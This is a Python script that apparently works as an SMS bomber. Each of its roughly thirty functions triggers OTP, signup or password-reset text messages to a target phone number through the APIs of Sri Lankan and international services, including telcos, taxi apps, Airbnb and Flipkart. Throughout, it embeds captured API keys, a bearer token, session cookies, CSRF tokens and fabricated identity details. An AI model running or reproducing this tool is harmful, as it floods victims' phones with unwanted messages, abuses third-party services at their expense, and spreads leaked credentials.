from requests import post
import time
def yogo(num,delay):
    url='http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
    body={'countrycode':'94','mobile':num,'name':'santha','email':''}
    po=post(url,data=body)
    time.sleep(delay)
def mega(num,delay):
    url='https://megarun.dialog.lk/api/v2/user'
    body={'mobile':num[1:]}
    po=post(url,data=body)
    time.sleep(delay)
def guru(num,delay):
    url='https://guru.lk/auth/headstart/ajax.php'
    body={'phone':num,'course':'1','sesskey':'','action':'sms_reg'}
    po=post(url,data=body)
    time.sleep(delay)
def slmat(num,delay):
    url='https://www.srilankanmatrimony.com/api/1/6'
    headers={'Authorization':'Basic YWRtaW46bFJxVzZXTlQ=','Content-Type':'application/x-www-form-urlencoded','Host':'www.srilankanmatrimony.com'}
    data={'Module':'','MatriId':'LKA841313','PackageName':'com.srilankanmatrimony','AppVersionCode':'148','SignalStrength':'','AppVersion':'6.0','EncryptId':'58ceb12be79bde7e7a1b8ca366823fad099ba147','Referrer':'Page3','NetworkType':'WIFI','UniqueId':'','mima':'yes','DeviceVersion':'5.1','DeviceModel':'HUAWEI%20LUA-U22','contactdet':f'%7B%22PriMobileCountryCode%22%3A%22%2B94%22%2C%22PriMobileNo%22%3A%22{num[1:]}%22%2C%22MatriId%22%3A%22LKA841313%22%7D','DevicePlatform':'Android','OutputType':'2','CommunityId':'2007','AppType':'102','CarrierName':'','Gender':'1'}
    po=post(url,headers=headers,data=data)
    time.sleep(delay)
def kangaroo(num,delay):
    url='https://customer.kangarooapps.com/customer-api/customers/create'
    body={'email':'a1@slt.net','firstName':'A','lastName':'b','password':'abcd1234','contactNumber':num[1:],'countryCode':'+94'}
    crereq=post(url,data=body)
    url='https://customer.kangarooapps.com/customer-api/customers/password/forgot'
    body={'contactNumber':num,'countryCode':'+94'}
    po=post(url,data=body)
    time.sleep(delay)
def dtamart(num,delay):
    url='https://www.datamart.lk/home/otpForViewUsage'
    body={'serviceNum':num}
    po=post(url,data=body)
    time.sleep(delay)
def dtamart2(num,delay):
    def precon(num):
        url='https://www.datamart.lk/home/actPreConfirm'
        headers={'Host':'www.datamart.lk','Content-Type':'application/x-www-form-urlencoded'}
        cookies=dict(JSESSIONID='y8XRkErbp8P8cyqW3RXrMM7W',_ga='GA1.2.1867291426.1595041842',_gid='GA1.2.779901286.1595041842',_gat_gtag_UA_126914918_1='1')
        body=dict(serviceNumber=num,reServiceNumber=num,selector117='a',paymentMethod='a',packageRefNo='117')
        po=post(url,headers=headers,cookies=cookies,data=body)
    def sms():
        url='https://www.datamart.lk/home/payPrePkg'
        headers={'Host':'www.datamart.lk','Content-Type':'application/x-www-form-urlencoded'}
        cookies=dict(JSESSIONID='y8XRkErbp8P8cyqW3RXrMM7W',_ga='GA1.2.1867291426.1595041842',_gid='GA1.2.779901286.1595041842',_gat_gtag_UA_126914918_1='1')
        po=post(url,headers=headers,cookies=cookies)
        return po.text
    precon(num)
    res=sms()
    time.sleep(delay)
def doc(num,delay):
    url='https://mobile.doc.lk/user-register/send-sms'
    head={'Host':'mobile.doc.lk','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
    body={'formId':'469738','country':'1','phone':num,'email':'','_token':'JnkhHDk6zEg3jtnWhz1rI0z2ETGtcsXW4TdtoiVy'}
    req=post(url,headers=head,data=body)
    time.sleep(delay)
def pat(num,delay):
    url='https://www.patpat.lk/api/customer.php'
    para={'customer':'new_customer'}
    head={'Host':'www.patpat.lk'}
    body={'title':'Mr.','first_name':'ගලපිටමඩ ආරච්චිලාගේ සාන්ත','last_name':'සාන්ත ගලේගොඩ','email':'s1@l.lk','password':'MTIzNDU2Nw==','telephone':num,'gender':'','dob':'1976-08-24'}
    po=post(url,params=para,headers=head,json=body)
    time.sleep(delay)
def ona(num,delay):
    url='https://cognito-idp.ap-southeast-1.amazonaws.com/'
    head={'x-amz-target':'AWSCognitoIdentityProviderService.InitiateAuth','Content-Type':'application/x-amz-json-1.1','Host':'cognito-idp.ap-southeast-1.amazonaws.com'}
    body={'AuthFlow':'CUSTOM_AUTH','ClientId':'uv3fuaop27riqv417pgivo447','AuthParameters':{'USERNAME':'+94'+num[1:]},'ClientMetadata':{}}
    def mkacc(num):
        url='https://cognito-idp.ap-southeast-1.amazonaws.com/'
        head={'x-amz-target':'AWSCognitoIdentityProviderService.SignUp','Content-Type':'application/x-amz-json-1.1','Host':'cognito-idp.ap-southeast-1.amazonaws.com'}
        json={"ClientId":"uv3fuaop27riqv417pgivo447","Username":"+94"+num[1:],"Password":"123456","UserAttributes":[{"Name":"name","Value":"abc"}],"ValidationData":[]}
        post(url,headers=head,json=json)
    po=post(url,headers=head,json=body)
    time.sleep(delay)
def idea(num,delay):
    url='https://portal.ideabiz.lk/v2/user/otpRequest'
    head={'Host':'portal.ideabiz.lk'}
    body={"method":"ANC","msisdn":"94"+num[1:]}
    po=post(url,headers=head,json=body)
    time.sleep(delay)
def airbnb(num,delay):
    url='https://www.airbnb.com/api/v2/phone_one_time_passwords'
    headers=dict(Host='www.airbnb.com')
    params=dict(currency='USD',key='d306zoyjsyarp7ifhu67rjxn52tv0t20',locale='en')
    num = '94' + num
    data=dict(phoneNumber=num,workFlow='GLOBAL_SIGNUP_LOGIN',otpMethod='AUTO')
    po=post(url,params=params,headers=headers,json=data)
    time.sleep(delay)
def mobself(num,delay):
    url='https://mdp.mobitel.lk/mfp/api/adapters/SelfCareAdapter/account/addNumberToApp'
    header={'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjRkZTNlODQ1LTAwMDctNDVkYy04ZjhhLWYzYzM5Y2QyMDE2YiIsIm4iOiJBTTBEZDd4QWR2NkgteWdMN3I4cUNMZEUtM0kya2s0NXpnWnREZF9xczhmdm5ZZmRpcVRTVjRfMnQ2T0dHOENWNUNlNDFQTXBJd21MNDEwWDlJWm52aHhvWWlGY01TYU9lSXFvZS1ySkEwdVp1dzJySGhYWjNXVkNlS2V6UlZjQ09Zc1FOLW1RSzBtZno1XzNvLWV2MFVZd1hrU093QkJsMUVocUl3VkR3T2llZzJKTUdsMEVYc1BaZmtOWkktSFU0b01paS1Uck5MelJXa01tTHZtMDloTDV6b3NVTkExNXZlQ0twaDJXcG1TbTJTNjFuRGhIN2dMRW95bURuVEVqUFk1QW9oMmluSS0zNlJHWVZNVVViTzQ2Q3JOVVl1SW9iT2lYbEx6QklodUlDcGZWZHhUX3g3c3RLWDVDOUJmTVRCNEdrT0hQNWNVdjdOejFkRGhJUHU4PSJ9fQ.eyJpc3MiOiJjb20uaWJtLm1mcCIsInN1YiI6IjRkZTNlODQ1LTAwMDctNDVkYy04ZjhhLWYzYzM5Y2QyMDE2YiIsImF1ZCI6ImNvbS5pYm0ubWZwIiwiZXhwIjoxNTk2MzQxMjUyNzY2LCJzY29wZSI6IlJlZ2lzdGVyZWRDbGllbnQgU2VsZkNhcmVTY29wZSJ9.s8wa0ga9uNVPyswtgsOhLnFUrEffSEOFuJ9X6uRPg-QSJKK16BI-QZA7yX6n1QDiSyssZmD_kczgIpGgeguQ2ulgi3r7ymxvf7QmAaXdDVXb2EVD_B7GZls1w8uZmrh6h07OkZIH6nEDDYapqcIEuJXPlNbUGUy5rgAnZcYSQ_-8PKMQoiYWG_RHeOaCmA5aiwEuqRWbIk-QO3x8BJ_rQ5DlnG20XOHttYnW2YgniQsWLr2dagM_Oe7CX7NMADjxxHh9XwTUkrqbtIqPZGnSVFb_sxkdvYWyoptDxGo4iamXfXmBi1ol0wDqm81CxmW-h9ql5QJzsQ2_WjIG8OZeRQ', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'mdp.mobitel.lk'}
    data=f'params=%5B%7B%22device_type%22%3A%22desktop%22%2C%22appType%22%3A%22android%22%2C%22platformName%22%3A%22Android%22%2C%22user_id%22%3A%22-%22%2C%22testMode%22%3Afalse%2C%22trn_id%22%3A6%2C%22controller%22%3A%22account%22%2C%22action%22%3A%22addNumberToApp%22%2C%22platformVersion%22%3A%2210%22%2C%22device_version%22%3A%2210%22%2C%22device_manufacturer%22%3A%22HMD%20Global%22%2C%22deviceRef%22%3A%2204ff7be9ec7d63ba_381596262673267%22%2C%22device_id%22%3A%2204ff7be9ec7d63ba%22%2C%22device_platform%22%3A%2210%22%2C%22device_imsi%22%3A%2204ff7be9ec7d63ba%22%2C%22deviceModel%22%3A%22WSP_sprout%22%2C%22deviceToken%22%3A%22x2kmc48jb6g24147w817et6a19.769369435a%22%2C%22appVersion%22%3A%223.0.2%22%2C%22prePostType%22%3A%22%22%2C%22conn%22%3A%22%22%2C%22language%22%3A%22en%22%2C%22primaryConn%22%3A%22%22%2C%22user_type%22%3A%22%22%2C%22session_key%22%3A%22%22%2C%22package%22%3A%22%22%2C%22network_type%22%3A%22cellular%22%2C%22lob%22%3A%22%22%2C%22pushID%22%3A%22fv_AAyv6i9g%3AAPA91bFir7VaQDLBuSgSW8AQRZ8wVX78ZbGanuKIEDM0zrPhUrYiU62disk6k1jL242HQs6RPCLCmeIzNStQ30JZk7d7wGYVGZANWA74ceoui5d-PaeeNoFhnrzopSbQTs7EbaqjncfR%22%2C%22mobileNumber%22%3A%22{num}%22%7D%5D'
    po=post(url,headers=header,data=data)
    time.sleep(delay)
def flipkrt(num,delay):
    url='https://rome.api.flipkart.net/1/action/view'
    headers={'Host':'rome.api.flipkart.net','secureToken':'RNsqo12ukbfrmpJgIGzjV4PzGrCABA+Jge5SavXmgUOmlVF7pEaMjDPYkZUiLSdHwaDRcnAmjwXyj7lZpNtsVg==','X-User-Agent':'Mozilla/5.0 (Linux; Android 10; Nokia 2.2 Build/QP1A.190711.020) FKUA/Retail/1140010/Android/Mobile (HMD Global/Nokia 2.2/08f43819400267ace00706df3429a61c)','Accept-Encoding':'gzip'}
    json={'actionRequestContext':{'type':'LOGIN_IDENTITY_VERIFY','loginId':num,'loginIdPrefix':'+94','phoneNumberFormat':'E164','addAppHash':True,'loginType':'MOBILE','verificationType':'OTP','sourceContext':'MY_ACCOUNT','clientQueryParamMap':None}}
    po=post(url,headers=headers,json=json)
    time.sleep(delay)
def hutcliq(num,delay):
    url='https://cliq.hutch.lk/api/services/auth/v1/login/smscode'
    params={'prefix':'94','sdn':num[1:]}
    head={'Host':'cliq.hutch.lk','Accept-Encoding':'gzip'}
    po=get(url,params=params,headers=head)
    time.sleep(delay)
def hutself(num,delay):
    url='https://oneapp.hutch.lk/hutch_1_0/index.php'
    params={'r':'/scapp/account/sendOTP'}
    head={'Host':'oneapp.hutch.lk','Content-Length':'152','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
    body={'appType':'android','appVersion':'2.0.1','conn':num[1:],'deviceModel':'Nokia+2.2','deviceRef':'68e6a23f3b598e32','deviceVersion':'10','language':'en','lob':'mobile','prePostType':'pre'}
    po=post(url,params=params,headers=head,data=body)
    time.sleep(delay)
def nanasa(num,delay):
    url='http://internal-nenasa.dialog.lk/api/mobile/v1/pin'
    header={'Content-Type':'application/json','Host':'internal-nenasa.dialog.lk'}
    body={'number':num,'type':'ANDROID'}
    po=post(url,headers=header,json=body)
    time.sleep(delay)
def sing(num,delay):
    url='https://apps.appmaker.lk/ideabiz/subscribePin'
    head={'Host':'apps.appmaker.lk'}
    body={'appId':'5ddd5cf840471839fef5125f','uuId':'04ff7be9ec7d63ba','msisdn': '94'+num[1:]}
    po=post(url,headers=head,json=body)
    time.sleep(delay)
def savari(num,delay):
    url='https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
    body={'email':'a1@slt.net','numCountryCode':'+94','phoneNum':num[1:],'referralCode':'','userType':'passenger'}
    po=post(url,json=body)
    time.sleep(delay)
def youcab(num,delay):
    url='http://youcab-apps.com/vconnect/passenger/v1/clientPinRequestData_droid.php'
    body={'countrycode':'%2B94','mobile':num,'name':'s','email':''}
    po=post(url,data=body)
    time.sleep(delay)
def domin(num,delay):
    url='https://apis.dominoslk.com/loginhandler/forgotpassword'
    headers={'Host':'apis.dominoslk.com'}
    data={'lastName':'','mobile':num[1:],'firstName':''}
    po=post(url,headers=headers,json=data)
    time.sleep(delay)
def upay(num,delay):
    def getid(num):
        url='https://apigateway.upay.lk/platform-service/customer/signup/heyu'
        headers={'Host':'apigateway.upay.lk','x-api-key':'IdHobBMY1q70qCMnWECcV1FZw6AVGnyH5pSTaHKa'}
        json={'name':'Santha','mobile':num,'username':'+94'+num,'countryCode':'+94','password':'1234','deviceInfo':{'deviceType':'MOBILE','deviceUUID':'68e6a23f3b598e32','deviceSerial':'nkonuwn','deviceModel':'Nokia 2.2','os':'Android','deviceManufacturer':'HMD Global','osVersion':'10','isVirtual':False},'termsAndConditionsVersionId':'2.0','privacyPolicyVersionId':'2.0','signUpReferrer':None}
        idreq=post(url,headers=headers,json=json)
        return idreq
    idreq=getid(num)
    def sms(idreq):
        url='https://apigateway.upay.lk/platform-service/otp/request'
        header={'Host':'apigateway.upay.lk','x-api-key':'IdHobBMY1q70qCMnWECcV1FZw6AVGnyH5pSTaHKa'}
        json={'otpType':'SIGNUP','notificationMedium':'MOBILE','userId':idreq.json()['data']['userId']}
        po=post(url,headers=header,json=json)
        idreq=getid(num)
        #sms(idreq)
    sms(idreq)
    time.sleep(delay)
def oli(num,delay):
    url='https://compete.slmathsolympiad.org/api/parent/verifyPhone'
    head={'Host':'compete.slmathsolympiad.org','User-Agent': 'Mozilla/5.0 (Linux; Android 10; Nokia 2.2 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Content-Type':'application/json'}
    data={"phone1":num}
    po=post(url,headers=head,json=data)
    time.sleep(delay)
def echan(num,delay):
    url='https://www.echannelling.com/Echannelling/member-registration-otp'
    body={'paymentMode':'FMR','title':'Mr','firstName':'Santha','lastName':'Fernando','memberType':'FREE','country':'','nic':'200218009878','dobs':'02/08/1982','pindelivery':'','deliveryAddress':'eChannellingPLC','cardCollect':'collect','password':'123456','email':'santha@abc.net','mobile':num,'address':'','other':'','totalFee':'0','joiningFee':'0','annualFee':'0','postalFee':'0','ipAddress':'10.10.10.2','_csrf':'fb7ec8ee-e67b-426f-be2b-ea758cd36337'}
    cook={'JSESSIONID':'"ZluYAaDbKmNTQRukItTWPgCxpV6LIng29fEPLH0Z.eclweb1:WEB"','visid_incap_39664':'p8PgpfbhRuaCkFBju9aA7ma+Q18AAAAAQUIPAAAAAAAUQ8+pDxLUnat9dqq+MRfa','incap_ses_710_39664':'IPXkGK219lUZsyecVm3aCWe+Q18AAAAA2SIRp1laE3ZLECaWvVXqlA','incap_ses_956_39664':'drPhUPT/tDkEIQajBmVEDe6+Q18AAAAAIMutR3cr3F7dT0ztYaSlIg','___utmvc':'hRvMVqJaHn/3b6RgYW++A5S10FijhuOaumbUsvJpJjv3+IJ3YpKZI005FrgnwjQ3ToVjGZo8d4kDOnn6myp9c0rXbpzQa8dJXdfX2b7DFK5ivOCDV5X3iZodoanVdZEXJcV91VlrPrxSm7A7PMkWa0OWD/V3qLtzg6EbjV3lM3mXCplJi1l/gENZhLCA2pwmpQ+UkHiTo4k/qt5BX699mJhUS87jUdu4QCG99QCleonCzxjhjrwZAgx8yXsD+Duhy5suipjlriL11VWaJPA2MDzgx6tdFyJhfWC14gQwxxSF94QS/oA8m80JZBzLWU6HHpYdN1Ec7vlpg4Ul7tPXCkhsGTRRRwNiBW62PEAlLcVrHtonXgvYahTF9Ij7yvqemh7zJLgwgsYM/A40y8hwFxFjA4kS9eGNEC2vwWG93FSnCILiaf0sd32oVIEiN+nIbZzIK3Y1MGtg/PlNABc2kUy8Ei7sckBttZTNif4ecyV8lSpOJCY/Y2OkKNa5MdyD6iQKDsyYnVojyQXS3pgiMHyjF2zC9ymH92Inj1Y7AQCp4EhwP9P2QHyQKs1cM/bGtdDeGUx+Yjdvi6jBfABAn919XwGg5/tnnLl2kzvyEt1m75/hN71KRblruEZLRJijcme+iP1X/0fzuJLKMQLP1pE1jg5Mwxao2hyN7qIcbxtOTc7OrmXqKYRg5J/2P/OvHLeBvCYulzRS4XbZve0d2tvB0ztV4PYMovEN9/jphssdAbSqBjpu+1vsIK1RAWo41xwzHXQy1bUqMDErkS7AGAQXgjS6WbYOCiG/YvtYXnYNNen0LEeIPF8R2T5NrRTfKW9CTfYAJBUn/zvNrUux3LJKR0/qIHzs+RSW9Ls4rriAPaMHurwGyxRWpvMRhJQ/WbZLzRgN6kT7jFy1V1MEdUcYHM8bWtntYdMdmAUGlsqLPK27+KeFJH2h+NngCsFBN9qCkkud85Uy+gi6IsEJuxuxMu+me4dcIhii/t5AAlzbs68A1AqlNZo4FTeqh1HZhg8Tr2n/4x7mq5Jtk0DQVg/+/72TTVgcR5Ec28Lf8V3r2GqmCpLO3Yusxt2lpD8BoHVTAY0HYdHfx3fykugPEgOarTOcDzFl4FcHYcustxw5iF1fHJ3X1TtbvwAD70kc6lQrz51elz2p1R/BGUQMPIB5XCcSRZgyKZDRIJafqCZMfbd1Ef2KKFv1/ksdzBStY+S0i8VZNCunFDoaRZhvsmDyywFcqg+3wvg2m48kmF62LgJYx3inQnxgGLr/kumqtOkd400RrVQgniXat4986veHStUl1cEPJqg9lK4B4ZgfFtLVnUTpkwLXc4h/zqeG9xJCXSE4Fhf7PSNkVNyIteaw8G7O5U7uXeM2K47hf64sYW3gCo+1KImRwIcYqwa7k8seYZLfMgq5lENscUd5uinHnpUz42bJALEmDqb2+LR4rMOerSsumUrsnSyeZtKa4EgfDppTrc3Ys+Kr5vM0HXSj2ncp6KlqCm+uhUA6+KpgJT2r6uiAZmI45mxI0gKsWX4tN33cviDeMsUY+IaEMpdnI5z+C5H/3riAj5WtrLUQISOtQKJMAClK5AskZEPcNP/7agqdu1l66ITGOHsvGg+7PG/J/8hmhY/FnJyi8ASaLGRpZ2VzdD0xMTQ0NTUsMTE0NTQyLHM9YWFhN2E2Nzc3ZTY0OWU2MWEyNzc4NGFjODk4Njc1ODNhOWE0YTI2M2ExNzhhMTY2NzdhMDg2N2E4Yjg5ODE5ODdiOTRhNzg1ODg3NTZmNmU'}
    head={'Host':'www.echannelling.com','Content-Type':'application/x-www-form-urlencoded'}
    po=post(url,headers=head,cookies=cook,data=body)
